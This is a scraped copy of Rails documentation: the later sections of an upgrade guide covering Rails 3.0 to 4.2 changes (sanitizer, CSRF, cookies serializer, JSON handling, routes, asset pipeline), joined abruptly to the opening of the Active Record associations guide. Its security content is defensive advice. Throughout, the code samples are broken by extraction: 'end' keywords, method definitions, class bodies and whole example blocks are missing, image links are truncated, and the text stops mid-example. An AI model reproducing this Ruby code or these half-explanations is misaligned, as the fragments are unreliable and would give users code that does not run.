config.log_level = :info
### `after_bundle` in Rails templates
If you have a Rails template that adds all the files in version control, it<n>fails to add the generated binstubs because it gets executed before Bundler:
# template.rb
generate(:scaffold, "person name:string")
route "root to: 'people#index'"
rake("db:migrate")
git :init
git add: "."
git commit: %Q{ -m 'Initial commit' }
You can now wrap the `git` calls in an `after_bundle` block. 
It will be run<n>after the binstubs have been generated.
after_bundle do
  git :init
  git add: "."
  git commit: %Q{ -m 'Initial commit' }
### Rails HTML Sanitizer
There's a new choice for sanitizing HTML fragments in your applications. 
The<n>venerable html-scanner approach is now officially being deprecated in favor of<n>[`Rails HTML Sanitizer`](https://github.com/rails/rails-html-sanitizer).
This means the methods `sanitize`, `sanitize_css`, `strip_tags` and<n>`strip_links` are backed by a new implementation.
This new sanitizer uses [Loofah](https://github.com/flavorjones/loofah) internally. 
Loofah in turn uses Nokogiri, which<n>wraps XML parsers written in both C and Java, so sanitization should be faster<n>no matter which Ruby version you run.
The new version updates `sanitize`, so it can take a `Loofah::Scrubber` for<n>powerful scrubbing.
[See some examples of scrubbers here](https://github.com/flavorjones/loofah#loofahscrubber).
Two new scrubbers have also been added: `PermitScrubber` and `TargetScrubber`.
Read the [gem's readme](https://github.com/rails/rails-html-sanitizer) for more information.
The documentation for `PermitScrubber` and `TargetScrubber` explains how you<n>can gain complete control over when and how elements should be stripped.
If your application needs to use the old sanitizer implementation, include `rails-deprecated_sanitizer` in your Gemfile:
gem 'rails-deprecated_sanitizer'
### Rails DOM Testing
The [`TagAssertions` module](http://api.rubyonrails.org/classes/ActionDispatch/Assertions/TagAssertions.html) (containing methods such as `assert_tag`), [has been deprecated](https://github.com/rails/rails/blob/6061472b8c310158a2a2e8e9a6b81a1aef6b60fe/actionpack/lib/action_dispatch/testing/assertions/dom.rb) in favor of the `assert_select` methods from the `SelectorAssertions` module, which has been extracted into the [rails-dom-testing gem](https://github.com/rails/rails-dom-testing).
### Masked Authenticity Tokens
In order to mitigate SSL attacks, `form_authenticity_token` is now masked so that it varies with each request.  
Thus, tokens are validated by unmasking and then decrypting.  
As a result, any strategies for verifying requests from non-rails forms that relied on a static session CSRF token have to take this into account.
### Action Mailer
Previously, calling a mailer method on a mailer class will result in the<n>corresponding instance method being executed directly. 
With the introduction of<n>Active Job and `#deliver_later`, this is no longer true. 
In Rails 4.2, the<n>invocation of the instance methods are deferred until either `deliver_now` or<n>`deliver_later` is called. 
class Notifier < ActionMailer::Base
  def notify(user, ...)
    puts "Called"
    mail(to: user.email, ...)
mail = Notifier.notify(user, ...) 
mail = mail.deliver_now           # Prints "Called"
  def self.broadcast_notifications(users, ...)
    users.each { |user| Notifier.notify(user, ...) 
bundle install
Upgrading from Rails 4.0 to Rails 4.1
### CSRF protection from remote `<script>` tags
Or, "whaaat my tests are failing!!!?"
Cross-site request forgery (CSRF) protection now covers GET requests with<n>JavaScript responses, too. 
This prevents a third-party site from referencing<n>your JavaScript URL and attempting to run it to extract sensitive data.
This means that your functional and integration tests that use
get :index, format: :js
will now trigger CSRF protection. 
Switch to
xhr :get, :index, format: :js
to explicitly test an `XmlHttpRequest`.
If you really mean to load JavaScript from remote `<script>` tags, skip CSRF<n>protection on that action.
### Spring
If you want to use Spring as your application preloader you need to:
Add `gem 'spring', group: :development` to your `Gemfile`.
Install spring using `bundle install`.
Springify your binstubs with `bundle exec spring binstub --all`.
NOTE: User defined rake tasks will run in the `development` environment by<n>default. 
If you want them to run in other environments consult the<n>[Spring README](https://github.com/rails/spring#rake).
### `config/secrets.yml`
If you want to use the new `secrets.yml` convention to store your application's<n>secrets, you need to:
Create a `secrets.yml` file in your `config` folder with the following content:
    ```yaml
      secret_key_base:
Use your existing `secret_key_base` from the `secret_token.rb` initializer to<n>   set the SECRET_KEY_BASE environment variable for whichever users running the<n>   Rails application in production mode. 
Alternatively, you can simply copy the existing<n>   `secret_key_base` from the `secret_token.rb` initializer to `secrets.yml`<n>   under the `production` section, replacing '<%= ENV["SECRET_KEY_BASE"] %>'.
Remove the `secret_token.rb` initializer.
Use `rake secret` to generate new keys for the `development` and `test` sections.
Restart your server.
### Changes to test helper
If your test helper contains a call to<n>`ActiveRecord::Migration.check_pending!` this can be removed. 
The check<n>is now done automatically when you `require 'rails/test_help'`, although<n>leaving this line in your helper is not harmful in any way.
### Cookies serializer
Applications created before Rails 4.1 uses `Marshal` to serialize cookie values into<n>the signed and encrypted cookie jars. 
If you want to use the new `JSON`-based format<n>in your application, you can add an initializer file with the following content:
Rails.application.config.action_dispatch.cookies_serializer = :hybrid
This would transparently migrate your existing `Marshal`-serialized cookies into the<n>new `JSON`-based format.
When using the `:json` or `:hybrid` serializer, you should beware that not all<n>Ruby objects can be serialized as JSON. For example, `Date` and `Time` objects<n>will be serialized as strings, and `Hash`es will have their keys stringified.
class CookiesController < ApplicationController
  def set_cookie
    cookies.encrypted[:expiration_date] = Date.tomorrow # => Thu, 20 Mar 2014
    redirect_to action: 'read_cookie'
  def read_cookie
    cookies.encrypted[:expiration_date] # => "2014-03-20"
It's advisable that you only store simple data (strings and numbers) in cookies.
If you have to store complex objects, you would need to handle the conversion<n>manually when reading the values on subsequent requests.
If you use the cookie session store, this would apply to the `session` and<n>`flash` hash as well.
### Flash structure changes
Flash message keys are<n>[normalized to strings](https://github.com/rails/rails/commit/a668beffd64106a1e1fedb71cc25eaaa11baf0c1). They<n>can still be accessed using either symbols or strings. 
Looping through the flash<n>will always yield string keys:
flash["string"] = "a string"
flash[:symbol] = "a symbol"
# Rails < 4.1
flash.keys # => ["string", :symbol]
# Rails >= 4.1
flash.keys # => ["string", "symbol"]
Make sure you are comparing Flash message keys against strings.
### Changes in JSON handling
There are a few major changes related to JSON handling in Rails 4.1.
#### MultiJSON removal
MultiJSON has reached its [end-of-life](https://github.com/rails/rails/pull/10576)<n>and has been removed from Rails.
If your application currently depend on MultiJSON directly, you have a few options:
Add 'multi_json' to your Gemfile. 
Note that this might cease to work in the future
Migrate away from MultiJSON by using `obj.to_json`, and `JSON.parse(str)` instead.
WARNING: Do not simply replace `MultiJson.dump` and `MultiJson.load` with<n>`JSON.dump` and `JSON.load`. 
These JSON gem APIs are meant for serializing and<n>deserializing arbitrary Ruby objects and are generally [unsafe](http://www.ruby-doc.org/stdlib-2.0.0/libdoc/json/rdoc/JSON.html#method-i-load).
#### JSON gem compatibility
Historically, Rails had some compatibility issues with the JSON gem. 
Using<n>`JSON.generate` and `JSON.dump` inside a Rails application could produce<n>unexpected errors.
Rails 4.1 fixed these issues by isolating its own encoder from the JSON gem. 
The<n>JSON gem APIs will function as normal, but they will not have access to any<n>Rails-specific features. 
class FooBar
  def as_json(options = nil)
    { foo: 'bar' }
>> FooBar.new.to_json # => "{\"foo\":\"bar\"}"
>> JSON.generate(FooBar.new, quirks_mode: true) # => "\"#<FooBar:0x007fa80a481610>\""
#### New JSON encoder
The JSON encoder in Rails 4.1 has been rewritten to take advantage of the JSON<n>gem. 
For most applications, this should be a transparent change. 
However, as<n>part of the rewrite, the following features have been removed from the encoder:
Circular data structure detection
Support for the `encode_json` hook
Option to encode `BigDecimal` objects as numbers instead of strings
If your application depends on one of these features, you can get them back by<n>adding the [`activesupport-json_encoder`](https://github.com/rails/activesupport-json_encoder)<n>gem to your Gemfile.
#### JSON representation of Time objects
`#as_json` for objects with time component (`Time`, `DateTime`, `ActiveSupport::TimeWithZone`)<n>now returns millisecond precision by default. 
If you need to keep old behavior with no millisecond<n>precision, set the following in an initializer:
ActiveSupport::JSON::Encoding.time_precision = 0
### Usage of `return` within inline callback blocks
Previously, Rails allowed inline callback blocks to use `return` this way:
class ReadOnlyModel < ActiveRecord::Base
  before_save { return false } # BAD
This behavior was never intentionally supported. 
Due to a change in the internals<n>of `ActiveSupport::Callbacks`, this is no longer allowed in Rails 4.1. 
Using a<n>`return` statement in an inline callback block causes a `LocalJumpError` to<n>be raised when the callback is executed.
Inline callback blocks using `return` can be refactored to evaluate to the<n>returned value:
  before_save { false } # GOOD
Alternatively, if `return` is preferred it is recommended to explicitly define<n>a method:
  before_save :before_save_callback # GOOD
    def before_save_callback
      return false
This change applies to most places in Rails where callbacks are used, including<n>Active Record and Active Model callbacks, as well as filters in Action<n>Controller (e.g. `before_action`).
See [this pull request](https://github.com/rails/rails/pull/13271) for more<n>details.
### Methods defined in Active Record fixtures
Rails 4.1 evaluates each fixture's ERB in a separate context, so helper methods<n>defined in a fixture will not be available in other fixtures.
Helper methods that are used in multiple fixtures should be defined on modules<n>included in the newly introduced `ActiveRecord::FixtureSet.context_class`, in<n>`test_helper.rb`.
module FixtureFileHelpers
  def file_sha(path)
    Digest::SHA2.hexdigest(File.read(Rails.root.join('test/fixtures', path)))
ActiveRecord::FixtureSet.context_class.send :include, FixtureFileHelpers
### I18n enforcing available locales
Rails 4.1 now defaults the I18n option `enforce_available_locales` to `true`. 
This<n>means that it will make sure that all locales passed to it must be declared in<n>the `available_locales` list.
To disable it (and allow I18n to accept *any* locale option) add the following<n>configuration to your application:
config.i18n.enforce_available_locales = false
Note that this option was added as a security measure, to ensure user input<n>cannot be used as locale information unless it is previously known. 
Therefore,<n>it's recommended not to disable this option unless you have a strong reason for<n>doing so.
### Mutator methods called on Relation
`Relation` no longer has mutator methods like `#map!` and `#delete_if`. 
Convert<n>to an `Array` by calling `#to_a` before using these methods.
It intends to prevent odd bugs and confusion in code that call mutator<n>methods directly on the `Relation`.
# Instead of this
Author.where(name: 'Hank Moody').compact!
# Now you have to do this
authors = Author.where(name: 'Hank Moody').to_a
authors.compact!
### Changes on Default Scopes
Default scopes are no longer overridden by chained conditions.
In previous versions when you defined a `default_scope` in a model<n>it was overridden by chained conditions in the same field. 
Now it<n>is merged like any other scope.
Before:
* FROM "users" WHERE "users"."state" = 'active'
After:
To get the previous behavior it is needed to explicitly remove the<n>`default_scope` condition using `unscoped`, `unscope`, `rewhere` or<n>`except`.
  scope :active, -> { unscope(where: :state).where(state: 'active') }
  scope :inactive, -> { rewhere state: 'inactive' }
User.inactive
### Rendering content from string
Rails 4.1 introduces `:plain`, `:html`, and `:body` options to `render`. 
Those<n>options are now the preferred way to render string-based content, as it allows<n>you to specify which content type you want the response sent as.
* `render :plain` will set the content type to `text/plain`
* `render :html` will set the content type to `text/html`
* `render :body` will *not* set the content type header.
From the security standpoint, if you don't expect to have any markup in your<n>response body, you should be using `render :plain` as most browsers will escape<n>unsafe content in the response for you.
We will be deprecating the use of `render :text` in a future version. 
So please<n>start using the more precise `:plain`, `:html`, and `:body` options instead.
Using `render :text` may pose a security risk, as the content is sent as<n>`text/html`.
### PostgreSQL json and hstore datatypes
Rails 4.1 will map `json` and `hstore` columns to a string-keyed Ruby `Hash`.
In earlier versions, a `HashWithIndifferentAccess` was used. 
This means that<n>symbol access is no longer supported. 
This is also the case for<n>`store_accessors` based on top of `json` or `hstore` columns. 
Make sure to use<n>string keys consistently.
### Explicit block use for `ActiveSupport::Callbacks`
Rails 4.1 now expects an explicit block to be passed when calling<n>`ActiveSupport::Callbacks.set_callback`. 
This change stems from<n>`ActiveSupport::Callbacks` being largely rewritten for the 4.1 release.
# Previously in Rails 4.0
set_callback :save, :around, ->(r, &block) { stuff; result = block.call; stuff }
# Now in Rails 4.1
set_callback :save, :around, ->(r, block) { stuff; result = block.call; stuff }
Upgrading from Rails 3.2 to Rails 4.0
If your application is currently on any version of Rails older than 3.2.x, you should upgrade to Rails 3.2 before attempting one to Rails 4.0.
The following changes are meant for upgrading your application to Rails 4.0.
### HTTP PATCH
Rails 4 now uses `PATCH` as the primary HTTP verb for updates when a RESTful<n>resource is declared in `config/routes.rb`. 
The `update` action is still used,<n>and `PUT` requests will continue to be routed to the `update` action as well.
So, if you're using only the standard RESTful routes, no changes need to be made:
resources :users
<%= form_for @user do |f| %>
  def update
    # No change needed; PATCH will be preferred, and PUT will still work.
However, you will need to make a change if you are using `form_for` to update<n>a resource in conjunction with a custom route using the `PUT` HTTP method:
resources :users, do
  put :update_name, on: :member
<%= form_for [ :update_name, @user ] do |f| %>
  def update_name
    # Change needed; form_for will try to use a non-existent PATCH route.
If the action is not being used in a public API and you are free to change the<n>HTTP method, you can update your route to use `patch` instead of `put`:
`PUT` requests to `/users/:id` in Rails 4 get routed to `update` as they are<n>today. 
So, if you have an API that gets real PUT requests it is going to work.
The router also routes `PATCH` requests to `/users/:id` to the `update` action.
resources :users do
  patch :update_name, on: :member
If the action is being used in a public API and you can't change to HTTP method<n>being used, you can update your form to use the `PUT` method instead:
<%= form_for [ :update_name, @user ], method: :put do |f| %>
For more on PATCH and why this change was made, see [this post](http://weblog.rubyonrails.org/2012/2/26/edge-rails-patch-is-the-new-primary-http-method-for-updates/)<n>on the Rails blog.
#### A note about media types
The errata for the `PATCH` verb [specifies that a 'diff' media type should be<n>used with `PATCH`](http://www.rfc-editor.org/errata_search.php?rfc=5789). One<n>such format is [JSON Patch](http://tools.ietf.org/html/rfc6902). While Rails<n>does not support JSON Patch natively, it's easy enough to add support:
# in your controller
    format.json do
      # perform a partial update
      @article.update params[:article]
    format.json_patch do
      # perform sophisticated change
# In config/initializers/json_patch.rb:
Mime::Type.register 'application/json-patch+json', :json_patch
As JSON Patch was only recently made into an RFC, there aren't a lot of great<n>Ruby libraries yet. 
Aaron Patterson's<n>[hana](https://github.com/tenderlove/hana) is one such gem, but doesn't have<n>full support for the last few changes in the specification.
### Gemfile
Rails 4.0 removed the `assets` group from Gemfile. 
You'd need to remove that<n>line from your Gemfile when upgrading. 
You should also update your application<n>file (in `config/application.rb`):
# Require the gems listed in Gemfile, including any gems
# you've limited to :test, :development, or :production.
### vendor/plugins
Rails 4.0 no longer supports loading plugins from `vendor/plugins`. 
If you choose not to make them gems, you can move them into, say, `lib/my_plugin/*` and add an appropriate initializer in `config/initializers/my_plugin.rb`.
### Active Record
* Rails 4.0 has removed the identity map from Active Record, due to [some inconsistencies with associations](https://github.com/rails/rails/commit/302c912bf6bcd0fa200d964ec2dc4a44abe328a6). If you have manually enabled it in your application, you will have to remove the following config that has no effect anymore: `config.active_record.identity_map`.
* The `delete` method in collection associations can now receive `Fixnum` or `String` arguments as record ids, besides records, pretty much like the `destroy` method does. 
Previously it raised `ActiveRecord::AssociationTypeMismatch` for such arguments. 
From Rails 4.0 on `delete` automatically tries to find the records matching the given ids before deleting them.
* In Rails 4.0 when a column or a table is renamed the related indexes are also renamed. 
If you have migrations which rename the indexes, they are no longer needed.
* Rails 4.0 has changed `serialized_attributes` and `attr_readonly` to class methods only. 
You shouldn't use instance methods since it's now deprecated. 
You should change them to use class methods, e.g. `self.serialized_attributes` to `self.class.serialized_attributes`.
* Rails 4.0 has removed `attr_accessible` and `attr_protected` feature in favor of Strong Parameters. 
You can use the [Protected Attributes gem](https://github.com/rails/protected_attributes) for a smooth upgrade path.
* If you are not using Protected Attributes, you can remove any options related to<n>this gem such as `whitelist_attributes` or `mass_assignment_sanitizer` options.
* Rails 4.0 requires that scopes use a callable object such as a Proc or lambda:
  scope :active, where(active: true)
  # becomes
  scope :active, -> { where active: true }
* Rails 4.0 has deprecated `ActiveRecord::Fixtures` in favor of `ActiveRecord::FixtureSet`.
* Rails 4.0 has deprecated `ActiveRecord::TestCase` in favor of `ActiveSupport::TestCase`.
* Rails 4.0 has deprecated the old-style hash based finder API. This means that<n>  methods which previously accepted "finder options" no longer do.  
For example, `Book.find(:all, conditions: { name: '1984' })` has been deprecated in favor of `Book.where(name: '1984')`
* All dynamic methods except for `find_by_...` and `find_by_...!` are deprecated.
  Here's how you can handle the changes:
      * `find_all_by_...`           becomes `where(...)
      * `find_last_by_...`          becomes `where(...).last`.
      * `scoped_by_...`             becomes `where(...)
      * `find_or_initialize_by_...` becomes `find_or_initialize_by(...)`.
      * `find_or_create_by_...`     becomes `find_or_create_by(...)`.
* Note that `where(...)` returns a relation, not an array like the old finders. 
If you require an `Array`, use `where(...).to_a`.
* These equivalent methods may not execute the same SQL as the previous implementation.
* To re-enable the old finders, you can use the [activerecord-deprecated_finders gem](https://github.com/rails/activerecord-deprecated_finders).
### Active Resource
Rails 4.0 extracted Active Resource to its own gem. 
If you still need the feature you can add the [Active Resource gem](https://github.com/rails/activeresource) in your Gemfile.
### Active Model
* Rails 4.0 has changed how errors attach with the `ActiveModel::Validations::ConfirmationValidator`. 
Now when confirmation validations fail, the error will be attached to `:#{attribute}_confirmation` instead of `attribute`.
* Rails 4.0 has changed `ActiveModel::Serializers::JSON.include_root_in_json` default value to `false`. 
Now, Active Model Serializers and Active Record objects have the same default behavior. 
This means that you can comment or remove the following option in the `config/initializers/wrap_parameters.rb` file:
# Disable root element in JSON by default.
# ActiveSupport.on_load(:active_record) do
   self.include_root_in_json = false
# end
### Action Pack
* Rails 4.0 introduces `ActiveSupport::KeyGenerator` and uses this as a base from which to generate and verify signed cookies (among other things). 
Existing signed cookies generated with Rails 3.x will be transparently upgraded if you leave your existing `secret_token` in place and add the new `secret_key_base`.
  # config/initializers/secret_token.rb
  Myapp::Application.config.secret_token = 'existing secret token'
  Myapp::Application.config.secret_key_base = 'new secret key base'
Please note that you should wait to set `secret_key_base` until you have 100% of your userbase on Rails 4.x and are reasonably sure you will not need to rollback to Rails 3.x. 
This is because cookies signed based on the new `secret_key_base` in Rails 4.x are not backwards compatible with Rails 3.x. 
You are free to leave your existing `secret_token` in place, not set the new `secret_key_base`, and ignore the deprecation warnings until you are reasonably sure that your upgrade is otherwise complete.
If you are relying on the ability for external applications or Javascript to be able to read your Rails app's signed session cookies (or signed cookies in general) you should not set `secret_key_base` until you have decoupled these concerns.
* Rails 4.0 encrypts the contents of cookie-based sessions if `secret_key_base` has been set. 
Rails 3.x signed, but did not encrypt, the contents of cookie-based session. 
Signed cookies are "secure" in that they are verified to have been generated by your app and are tamper-proof. 
However, the contents can be viewed by end users, and encrypting the contents eliminates this caveat/concern without a significant performance penalty.
Please read [Pull Request #9978](https://github.com/rails/rails/pull/9978) for details on the move to encrypted session cookies.
* Rails 4.0 removed the `ActionController::Base.asset_path` option. 
Use the assets pipeline feature.
* Rails 4.0 has deprecated `ActionController::Base.page_cache_extension` option. 
Use `ActionController::Base.default_static_extension` instead.
* Rails 4.0 has removed Action and Page caching from Action Pack. 
You will need to add the `actionpack-action_caching` gem in order to use `caches_action` and the `actionpack-page_caching` to use `caches_pages` in your controllers.
* Rails 4.0 has removed the XML parameters parser. 
You will need to add the `actionpack-xml_parser` gem if you require this feature.
* Rails 4.0 changes the default memcached client from `memcache-client` to `dalli`. 
To upgrade, simply add `gem 'dalli'` to your `Gemfile`.
* Rails 4.0 deprecates the `dom_id` and `dom_class` methods in controllers (they are fine in views). 
You will need to include the `ActionView::RecordIdentifier` module in controllers requiring this feature.
* Rails 4.0 deprecates the `:confirm` option for the `link_to` helper. 
You should<n>instead rely on a data attribute (e.g. `data: { confirm: 'Are you sure?' }`).
This deprecation also concerns the helpers based on this one (such as `link_to_if`<n>or `link_to_unless`).
* Rails 4.0 changed how `assert_generates`, `assert_recognizes`, and `assert_routing` work. 
Now all these assertions raise `Assertion` instead of `ActionController::RoutingError`.
* Rails 4.0 raises an `ArgumentError` if clashing named routes are defined. 
This can be triggered by explicitly defined named routes or by the `resources` method. 
Here are two examples that clash with routes named `example_path`:
  get 'one' => 'test#example', as: :example
  get 'two' => 'test#example', as: :example
  resources :examples
In the first case, you can simply avoid using the same name for multiple<n>routes. 
* Rails 4.0 also changed the way unicode character routes are drawn. 
Now you can draw unicode character routes directly. 
If you already draw such routes, you must change them, for example:
get Rack::Utils.escape('こんにちは'), controller: 'welcome', action: 'index'
becomes
get 'こんにちは', controller: 'welcome', action: 'index'
* Rails 4.0 requires that routes using `match` must specify the request method. 
  # Rails 3.x
  match '/' => 'root#index'
  # becomes
  match '/' => 'root#index', via: :get
  # or
  get '/' => 'root#index'
* Rails 4.0 has removed `ActionDispatch::BestStandardsSupport` middleware, `<!DOCTYPE html>` already triggers standards mode per http://msdn.microsoft.com/en-us/library/jj676915(v=vs.85).aspx and ChromeFrame header has been moved to `config.action_dispatch.default_headers`.
Remember you must also remove any references to the middleware from your application code, for example:
# Raise exception
config.middleware.insert_before(Rack::Lock, ActionDispatch::BestStandardsSupport)
Also check your environment settings for `config.action_dispatch.best_standards_support` and remove it if present.
* In Rails 4.0, precompiling assets no longer automatically copies non-JS/CSS assets from `vendor/assets` and `lib/assets`. 
Rails application and engine developers should put these assets in `app/assets` or configure `config.assets.precompile`.
* In Rails 4.0, `ActionController::UnknownFormat` is raised when the action doesn't handle the request format. 
By default, the exception is handled by responding with 406 Not Acceptable, but you can override that now. 
In Rails 3, 406 Not Acceptable was always returned. 
No overrides.
* In Rails 4.0, a generic `ActionDispatch::ParamsParser::ParseError` exception is raised when `ParamsParser` fails to parse request params. 
You will want to rescue this exception instead of the low-level `MultiJson::DecodeError`, for example.
* In Rails 4.0, `SCRIPT_NAME` is properly nested when engines are mounted on an app that's served from a URL prefix. 
You no longer have to set `default_url_options[:script_name]` to work around overwritten URL prefixes.
* Rails 4.0 deprecated `ActionController::Integration` in favor of `ActionDispatch::Integration`.
* Rails 4.0 deprecated `ActionController::IntegrationTest` in favor of `ActionDispatch::IntegrationTest`.
* Rails 4.0 deprecated `ActionController::PerformanceTest` in favor of `ActionDispatch::PerformanceTest`.
* Rails 4.0 deprecated `ActionController::AbstractRequest` in favor of `ActionDispatch::Request`.
* Rails 4.0 deprecated `ActionController::Request` in favor of `ActionDispatch::Request`.
* Rails 4.0 deprecated `ActionController::AbstractResponse` in favor of `ActionDispatch::Response`.
* Rails 4.0 deprecated `ActionController::Response` in favor of `ActionDispatch::Response`.
* Rails 4.0 deprecated `ActionController::Routing` in favor of `ActionDispatch::Routing`.
### Active Support
Rails 4.0 removes the `j` alias for `ERB::Util#json_escape` since `j` is already used for `ActionView::Helpers::JavaScriptHelper#escape_javascript`.
### Helpers Loading Order
The order in which helpers from more than one directory are loaded has changed in Rails 4.0. 
Previously, they were gathered and then sorted alphabetically. 
After upgrading to Rails 4.0, helpers will preserve the order of loaded directories and will be sorted alphabetically only within each directory. 
Unless you explicitly use the `helpers_path` parameter, this change will only impact the way of loading helpers from engines. 
If you rely on the ordering, you should check if correct methods are available after upgrade. 
If you would like to change the order in which engines are loaded, you can use `config.railties_order=` method.
### Active Record Observer and Action Controller Sweeper
`ActiveRecord::Observer` and `ActionController::Caching::Sweeper` have been extracted to the `rails-observers` gem. 
You will need to add the `rails-observers` gem if you require these features.
### sprockets-rails
* `assets:precompile:primary` and `assets:precompile:all` have been removed. 
Use `assets:precompile` instead.
* The `config.assets.compress` option should be changed to `config.assets.js_compressor` like so for instance:
config.assets.js_compressor = :uglifier
### sass-rails
* `asset-url` with two arguments is deprecated. 
For example: `asset-url("rails.png", image)` becomes `asset-url("rails.png")`.
Upgrading from Rails 3.1 to Rails 3.2
If your application is currently on any version of Rails older than 3.1.x, you<n>should upgrade to Rails 3.1 before attempting an update to Rails 3.2.
The following changes are meant for upgrading your application to the latest<n>3.2.x version of Rails.
Make the following changes to your `Gemfile`.
group :assets do
  gem 'sass-rails',   '~> 3.2.6'
  gem 'coffee-rails', '~> 3.2.2'
  gem 'uglifier',     '>= 1.0.3'
### config/environments/development.rb
There are a couple of new configuration settings that you should add to your development environment:
# Raise exception on mass assignment protection for Active Record models
config.active_record.mass_assignment_sanitizer = :strict
# Log the query plan for queries taking more than this (works
# with SQLite, MySQL, and PostgreSQL)
config.active_record.auto_explain_threshold_in_seconds = 0.5
### config/environments/test.rb
The `mass_assignment_sanitizer` configuration setting should also be be added to `config/environments/test.rb`:
Rails 3.2 deprecates `vendor/plugins` and Rails 4.0 will remove them completely. 
While it's not strictly necessary as part of a Rails 3.2 upgrade, you can start replacing any plugins by extracting them to gems and adding them to your Gemfile. 
Option `:dependent => :restrict` has been removed from `belongs_to`. 
If you want to prevent deleting the object if there are any associated objects, you can set `:dependent => :destroy` and return `false` after checking for existence of association from any of the associated object's destroy callbacks.
Upgrading from Rails 3.0 to Rails 3.1
If your application is currently on any version of Rails older than 3.0.x, you should upgrade to Rails 3.0 before attempting an update to Rails 3.1.
The following changes are meant for upgrading your application to Rails 3.1.12, the last 3.1.x version of Rails.
gem 'rails', '3.1.12'
gem 'mysql2'
# Needed for the new asset pipeline
  gem 'sass-rails',   '~> 3.1.7'
  gem 'coffee-rails', '~> 3.1.1'
# jQuery is the default JavaScript library in Rails 3.1
gem 'jquery-rails'
### config/application.rb
The asset pipeline requires the following additions:
config.assets.enabled = true
config.assets.version = '1.0'
If your application is using an "/assets" route for a resource you may want change the prefix used for assets to avoid conflicts:
# Defaults to '/assets'
config.assets.prefix = '/asset-files'
Remove the RJS setting `config.action_view.debug_rjs = true`.
Add these settings if you enable the asset pipeline:
# Do not compress assets
config.assets.compress = false
# Expands the lines which load the assets
config.assets.debug = true
### config/environments/production.rb
Again, most of the changes below are for the asset pipeline. 
You can read more about these in the [Asset Pipeline](asset_pipeline.html) guide.
# Compress JavaScripts and CSS
config.assets.compress = true
# Don't fallback to assets pipeline if a precompiled asset is missed
config.assets.compile = false
# Generate digests for assets URLs
config.assets.digest = true
# Defaults to Rails.root.join("public/assets")
# config.assets.manifest = YOUR_PATH
# Precompile additional assets (application.js, application.css, and all non-JS/CSS are already added)
# config.assets.precompile += %w( search.js )
# Force all access to the app over SSL, use Strict-Transport-Security, and use secure cookies.
# config.force_ssl = true
You can help test performance with these additions to your test environment:
# Configure static asset server for tests with Cache-Control for performance
config.static_cache_control = 'public, max-age=3600'
### config/initializers/wrap_parameters.rb
Add this file with the following contents, if you wish to wrap parameters into a nested hash. 
This is on by default in new applications.
# Be sure to restart your server when you modify this file.
# This file contains settings for ActionController::ParamsWrapper which
# is enabled by default.
# Enable parameter wrapping for JSON. You can disable this by setting :format to an empty array.
ActiveSupport.on_load(:action_controller) do
  wrap_parameters format: [:json]
ActiveSupport.on_load(:active_record) do
  self.include_root_in_json = false
### config/initializers/session_store.rb
You need to change your session key to something new, or remove all sessions:
# in config/initializers/session_store.rb
AppName::Application.config.session_store :cookie_store, key: 'SOMETHINGNEW'
$ bin/rake db:sessions:clear
### Remove :cache and :concat options in asset helpers references in views
* With the Asset Pipeline the :cache and :concat options aren't used anymore, delete these options from your views.
Active Record Associations
This guide covers the association features of Active Record.
* How to declare associations between Active Record models.
* How to understand the various types of Active Record associations.
* How to use the methods added to your models by creating associations.
Why Associations?
Why do we need associations between models? 
Because they make common operations simpler and easier in your code. 
For example, consider a simple Rails application that includes a model for customers and a model for orders. 
Each customer can have many orders. 
Without associations, the model declarations would look like this:
class Customer < ActiveRecord::Base
Now, suppose we wanted to add a new order for an existing customer. 
We'd need to do something like this:
@order = Order.create(order_date: Time.now, customer_id: @customer.id)
Or consider deleting a customer, and ensuring that all of its orders get deleted as well:
@orders = Order.where(customer_id: @customer.id)
@orders.each do |order|
  order.destroy
@customer.destroy
With Active Record associations, we can streamline these - and other - operations by declaratively telling Rails that there is a connection between the two models. 
Here's the revised code for setting up customers and orders:
  has_many :orders, dependent: :destroy
  belongs_to :customer
With this change, creating a new order for a particular customer is easier:
@order = @customer.orders.create(order_date: Time.now)
Deleting a customer and all of its orders is *much* easier:
To learn more about the different types of associations, read the next section of this guide. 
That's followed by some tips and tricks for working with associations, and then by a complete reference to the methods and options for associations in Rails.
The Types of Associations
In Rails, an _association_ is a connection between two Active Record models. 
Associations are implemented using macro-style calls, so that you can declaratively add features to your models. 
For example, by declaring that one model `belongs_to` another, you instruct Rails to maintain Primary Key-Foreign Key information between instances of the two models, and you also get a number of utility methods added to your model. 
Rails supports six types of associations:
* `belongs_to`
* `has_one`
* `has_many`
* `has_many :through`
* `has_one :through`
* `has_and_belongs_to_many`
In the remainder of this guide, you'll learn how to declare and use the various forms of associations. 
But first, a quick introduction to the situations where each association type is appropriate.
### The `belongs_to` Association
A `belongs_to` association sets up a one-to-one connection with another model, such that each instance of the declaring model "belongs to" one instance of the other model. 
For example, if your application includes customers and orders, and each order can be assigned to exactly one customer, you'd declare the order model this way:
belongs_to Association Diagram](images/belongs_to.png)
NOTE: `belongs_to` associations _must_ use the singular term. 
If you used the pluralized form in the above example for the `customer` association in the `Order` model, you would be told that there was an "uninitialized constant Order::Customers". 
This is because Rails automatically infers the class name from the association name. 
If the association name is wrongly pluralized, then the inferred class will be wrongly pluralized too.
The corresponding migration might look like this:
class CreateOrders < ActiveRecord::Migration
    create_table :customers do |t|
      t.string :name
    create_table :orders do |t|
      t.belongs_to :customer
      t.datetime :order_date
### The `has_one` Association
A `has_one` association also sets up a one-to-one connection with another model, but with somewhat different semantics (and consequences). 
This association indicates that each instance of a model contains or possesses one instance of another model. 
For example, if each supplier in your application has only one account, you'd declare the supplier model like this:
class Supplier < ActiveRecord::Base
  has_one :account
has_one Association Diagram](images/has_one.png)
class CreateSuppliers < ActiveRecord::Migration
    create_table :suppliers do |t|
    create_table :accounts do |t|
      t.belongs_to :supplier
      t.string :account_number
### The `has_many` Association
A `has_many` association indicates a one-to-many connection with another model. 
You'll often find this association on the "other side" of a `belongs_to` association. 
This association indicates that each instance of the model has zero or more instances of another model. 
For example, in an application containing customers and orders, the customer model could be declared like this:
NOTE: The name of the other model is pluralized when declaring a `has_many` association.
has_many Association Diagram](images/has_many.png)
class CreateCustomers < ActiveRecord::Migration
### The `has_many :through` Association
A `has_many :through` association is often used to set up a many-to-many connection with another model. 
This association indicates that the declaring model can be matched with zero or more instances of another model by proceeding _through_ a third model. 
For example, consider a medical practice where patients make appointments to see physicians. 
The relevant association declarations could look like this:
class Physician < ActiveRecord::Base
  has_many :appointments
  has_many :patients, through: :appointments
class Appointment < ActiveRecord::Base
  belongs_to :physician
  belongs_to :patient
class Patient < ActiveRecord::Base
  has_many :physicians, through: :appointments
